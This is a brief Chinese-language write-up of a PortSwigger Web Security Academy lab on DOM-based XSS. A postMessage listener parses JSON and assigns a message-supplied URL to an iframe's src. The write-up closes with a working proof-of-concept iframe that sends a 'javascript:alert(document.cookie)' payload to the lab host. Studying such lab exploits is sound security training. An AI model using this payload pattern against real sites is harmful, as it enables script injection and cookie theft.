

![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/portswigger-labs/基于DOM的漏洞/images/A6FA99684776467B8D8D66D89C9F6F58clipboard.png)



```javascript
<script>
                        window.addEventListener('message', function(e) {
                            var iframe = document.createElement('iframe'), ACMEplayer = {element: iframe}, d;
                            document.body.appendChild(iframe);
                            try {
                                d = JSON.parse(e.data);
                            } catch(e) {
                                return;
                            }
                            switch(d.type) {
                                case "page-load":
                                    ACMEplayer.element.scrollIntoView();
                                    break;
                                case "load-channel":
                                    ACMEplayer.element.src = d.url;
                                    break;
                                case "player-height-changed":
                                    ACMEplayer.element.style.width = d.width + "px";
                                    ACMEplayer.element.style.height = d.height + "px";
                                    break;
                            }
                        }, false);
</script>
```



js脚本从消息中接收json数据，并将数据赋值给d。

当d.type=load-channel。src=d.url

此时src=d.url可能造成xss漏洞



poc:

```javascript
<iframe src=https://ac351ff41f350e7180a71db5005400d8.web-security-academy.net/ 
// \斜线用来转义
onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\"
:\"javascript:alert(document.cookie)\"}","*")'>
```

